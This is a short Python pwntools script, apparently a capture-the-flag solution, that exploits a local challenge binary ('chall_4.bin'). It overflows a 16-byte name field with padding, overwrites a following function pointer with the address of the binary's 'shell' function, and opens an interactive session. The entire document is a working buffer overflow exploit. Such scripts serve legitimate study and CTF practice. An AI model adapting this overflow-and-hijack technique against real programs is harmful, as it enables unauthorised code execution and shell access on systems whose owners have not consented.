#!/usr/bin/env python3

from pwn import *

p = process("./chall_4.bin")

binary = context.binary = ELF('./chall_4.bin')
shell_address = binary.sym.shell
log.info('shell_address: ' + hex(shell_address))

payload = b"A" * 16 # name
payload += b"A" * 8 # pad
payload += p64(shell_address) # func

p.recv()
p.sendline(payload)
p.interactive()